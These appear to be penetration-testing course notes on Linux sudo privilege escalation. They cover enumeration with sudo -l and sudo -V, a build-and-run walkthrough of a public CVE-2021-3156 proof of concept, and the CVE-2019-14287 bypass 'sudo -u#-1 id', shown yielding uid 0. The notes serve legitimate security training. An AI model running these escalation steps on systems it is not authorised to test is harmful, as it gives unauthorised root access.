## 1. What Is `sudo`?

`sudo` allows a user to execute a process with the privileges of another user, commonly `root`.

The rules governing who can run what are primarily defined in:

```text
/etc/sudoers
```

and additional rules may exist under:

```text
/etc/sudoers.d/
```

The module's example shows rules such as:

```text
root     ALL=(ALL:ALL) ALL
%admin   ALL=(ALL) ALL
%sudo    ALL=(ALL:ALL) ALL
cry0l1t3 ALL=(ALL) /usr/bin/id
```

---

# 2. `sudo -l` — First Enumeration Step

When performing Linux privilege escalation, run:

```bash
sudo -l
```

This shows what commands the current user is allowed to execute through sudo.

Example:

```text
User cry0l1t3 may run the following commands:
    ALL=(ALL) /usr/bin/id
```

Read the output carefully.

Look for:

```text
NOPASSWD
SETENV
ALL
(root)
Unusual binaries
```

---

# 3. Understanding Sudo Rules

A rule such as:

```text
cry0l1t3 ALL=(ALL) /usr/bin/id
```

can be understood as:

```text
cry0l1t3
   ↓
Can use sudo
   ↓
Run /usr/bin/id
   ↓
As another user
```

The exact command restrictions matter.

This connects directly to your earlier **Sudo Rights Abuse** module:

```text
sudo -l
   ↓
Identify allowed binary
   ↓
Understand what that binary can do
   ↓
Check for abuse path
```

---

# 4. Sudo Vulnerability — CVE-2021-3156

The module covers:

```text
CVE-2021-3156
```

This was a **heap-based buffer overflow** vulnerability in sudo.

The module lists affected versions including:

```text
Ubuntu 20.04 → sudo 1.8.31
Debian 10    → sudo 1.8.27
Fedora 33    → sudo 1.9.2
```

The vulnerability had existed for more than ten years before discovery.

---

# 5. Check Sudo Version

Use:

```bash
sudo -V | head -n1
```

Example:

```text
Sudo version 1.8.31
```

So the enumeration chain is:

```text
sudo -V
   ↓
Identify version
   ↓
Compare against known vulnerabilities
```

---

# 6. Identify the Operating System

Use:

```bash
cat /etc/lsb-release
```

Example:

```text
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

Now you have:

```text
OS:
Ubuntu 20.04.1

Sudo:
1.8.31
```

This information is important because exploit applicability can depend on the **specific OS/libc/sudo combination**, not merely the sudo version.

---

# 7. CVE-2021-3156 Exploit Workflow

The module uses a public PoC called:

```text
sudo-hax-me-a-sandwich
```

After obtaining it:

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

The build produces:

```text
sudo-hax-me-a-sandwich
```

and a supporting library.

---

# 8. Identify the Correct Exploit Target

Running:

```bash
./sudo-hax-me-a-sandwich
```

shows available targets.

The module's example includes:

```text
0) Ubuntu 18.04.5 - sudo 1.8.21
1) Ubuntu 20.04.1 - sudo 1.8.31
2) Debian 10.0 - sudo 1.8.27
```

Target selection therefore depends on the system you enumerated.

For the example:

```text
Ubuntu 20.04.1
```

the selected target is:

```text
1
```

---

# 9. Execute the PoC

The module runs:

```bash
./sudo-hax-me-a-sandwich 1
```

The PoC identifies:

```text
Ubuntu 20.04.1
sudo 1.8.31
libc-2.31
```

and attempts to obtain a root shell.

Verify:

```bash
id
```

Expected:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# 10. Important CPTS Lesson — Version Matching

Don't think:

```text
Old sudo = automatically vulnerable
```

Instead:

```text
sudo version
      +
OS version
      +
libc/environment
      +
specific vulnerability
      ↓
Determine exploit applicability
```

A PoC designed for one target may not work correctly against another.

---

# 11. CVE-2019-14287 — Sudo Policy Bypass

The second vulnerability covered is:

```text
CVE-2019-14287
```

The module states that it affected sudo versions below:

```text
1.8.28
```

The important prerequisite is that the user must be permitted by `/etc/sudoers` to execute a specific command.

Example:

```bash
sudo -l
```

Output:

```text
User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

So even though the user is only authorized to run:

```text
/usr/bin/id
```

the vulnerable sudo behavior can be abused.

---

# 12. Understanding `sudo -u#UID`

Sudo can specify the user ID under which a command should run.

For example, conceptually:

```text
sudo -u#1005 <command>
```

means:

```text
Run command as UID 1005
```

The module obtains the user's UID from:

```bash
cat /etc/passwd | grep cry0l1t3
```

Example:

```text
cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Therefore:

```text
UID = 1005
```

---

# 13. The `-1` UID Bypass

The vulnerability allows:

```text
-1
```

to be processed as:

```text
0
```

and UID `0` is root.

Conceptually:

```text
sudo -u#-1
       ↓
Vulnerable sudo processing
       ↓
UID 0
       ↓
ROOT
```

The module demonstrates:

```bash
sudo -u#-1 id
```

resulting in:

```text
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

Notice something important:

```text
uid=0(root)
gid=1005(cry0l1t3)
```

The **UID is root**, while the group remains the original user's group.

For privilege escalation, the critical part is:

```text
uid=0
```

---

# 14. CVE-2019-14287 Attack Chain

```text
sudo -l
   ↓
User allowed to run specific command
   ↓
Check sudo version
   ↓
Version < 1.8.28
   ↓
CVE-2019-14287 applicable
   ↓
Use negative UID
   ↓
-1 → 0
   ↓
Command executes with UID 0
   ↓
ROOT
```

---

# 15. CVE-2021-3156 vs CVE-2019-14287

||CVE-2021-3156|CVE-2019-14287|
|---|---|---|
|Type|Heap-based buffer overflow|Sudo policy bypass|
|Key condition|Vulnerable sudo version/environment|Vulnerable sudo version + allowed sudo command|
|Module versions|Examples include 1.8.21, 1.8.27, 1.8.31|Below 1.8.28|
|Core idea|Exploit memory corruption|Abuse UID handling|
|Result|Root shell|UID 0 / root privileges|

---

# 🔥 CPTS Sudo Enumeration Workflow

```text
                 sudo -l
                    │
                    ↓
        What can the user execute?
                    │
                    ↓
             sudo -V
                    │
                    ↓
            Check version
                    │
          ┌─────────┴─────────┐
          ↓                   ↓
   Misconfigured sudo    Vulnerable sudo
          ↓                   ↓
    GTFOBins / env       Research CVEs
          ↓                   ↓
       Exploit             Verify target
                              │
                              ↓
                           Exploit
                              │
                              ↓
                             ROOT
```

---

# 🧠 Sudo Checklist

Whenever you get a shell, make this one of your first commands:

```bash
sudo -l
```

Then:

### 1. Check version

```bash
sudo -V
```

### 2. Check OS

```bash
cat /etc/lsb-release
```

### 3. Inspect sudo rules

Look for:

```text
NOPASSWD
SETENV
ALL
specific binaries
environment preservation
```

### 4. Check known vulnerabilities

Especially when dealing with an old sudo version.

### 5. Verify after exploitation

```bash
id
```

or:

```bash
whoami
```

---

# 🔑 Final Memory Card

```text
                 SUDO
                  │
          ┌───────┴────────┐
          ↓                ↓
    Misconfiguration    Vulnerability
          │                │
          ↓                ↓
      sudo -l           sudo -V
          │                │
          ↓                ↓
   Allowed binaries    Version/CVE
          │                │
          ↓                ↓
  GTFOBins / abuse     Matching PoC
          │                │
          └───────┬────────┘
                  ↓
             PrivEsc
                  ↓
                ROOT
```

### 🔥 Two CVEs to remember

**CVE-2021-3156 → sudo heap-based buffer overflow**

**CVE-2019-14287 → negative UID (`-1`) policy bypass → UID 0**

### CPTS golden rule

> **`sudo -l` tells you what you can abuse; `sudo -V` tells you whether the sudo implementation itself may be vulnerable.**